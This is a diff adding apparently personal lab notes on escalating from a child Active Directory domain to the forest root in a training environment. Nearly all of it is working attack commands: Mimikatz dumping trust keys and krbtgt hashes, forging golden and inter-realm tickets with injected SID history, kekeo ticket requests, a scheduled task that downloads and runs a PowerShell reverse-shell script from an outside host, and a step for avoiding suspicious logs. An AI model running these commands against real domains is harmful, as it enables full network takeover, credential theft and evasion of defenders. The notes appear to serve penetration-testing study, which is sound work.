@@ -1,1 +1,84 @@
+Across Domains - Implicit two way trust relationship.
+
+Across Forests - Trust relationship needs to be established.
+
+--Child to Parent
+
+* Child to Forest Root (dollarcorp.moneycorp.local --> moneycorp.local)
+
+* Domains in the same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.
+
+* There are two ways of escalating privileges between two domains of the same forest:
+-krbtgt hash
+-Trust tickets
+
+
+-------------------------TRUST TICKETS-----------------------
+
+* Child to forest root using trust tickets
+
+* what is required to forget trust ticket is, obviously, the trust key
+	Look for [ In ] trust key from child to parent.
+
+
+---DOMAIN ADMIN PRIVILEGES
+
+
+
+-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+
+or
+
+-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+
+and then: (to get the group SID run 'Get-DomainGroup "Enterprise Admins" -Domain moneycorp.local')
+
+--Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:domainSID /sids:groupSID(enterpriseadmins/DA) /rc4:hashfromlsadump /service:krbtgt /target:moneycorp.local /ticket:C:\path\to\store.kirbi
+
+then: (from kekeo_old) - This could be executed from a low-privileged powershell
+
+.\asktgs.exe C:\path\to\store.kirbi CIFS(or HOST to attempt RCE)/mcorp-dc.moneycorp.local
+
+* CIFS CASE - \\mcorp-dc\c$ is available
+
+* HOST CASE - schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "whateverName" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.71/Invoke-PowerShellTcp.ps1''')'"
+** schtasks /Run /S mcorp-dc.moneycorp.local /TN "whateverName"
+
+then: (also from kekeo_old)
+
+.\kirbikator.exe lsa .\host.mcorp-dc.moneycorp.local.kirbi
+
+klist
+
+able to execute CIFS CASE and HOST CASE commands now, from a low privileged powershell window.
+
+
+-------------------------krbtgt HASH-----------------------
+
+*We will abuse SID history once again
+
+-----DOMAIN ADMIN PRIVILEGES
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' on the DC (get krbtgt hash) or
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+---Can from a low-priv powershell window:
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:domainSID /sids:groupSID(enterpriseadmins/DA) /krbtgt:krbtgtHash /ticket:C:\path\to\store.kirbi
+
+In the above command, the mimikatz option "/sids" is forcefully setting the SID History for the Enterprise Admins/Domain Admins group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin/Domain Admin group.
+
+then:
+
+Invoke-Mimikatz -Command '"kerberos::ptt C:\path\to\store.kirbk"'
+
+klist
+
+ls \\mcorp-dc\c$
+
+gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
+
+---Avoid suspicious logs
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:domainSID /groups:516 /sids:Domain Controllers,S-1-5-9(Enterprise Domain Cotrollers) /krbtgt:krbtgtHash /ptt"'
 
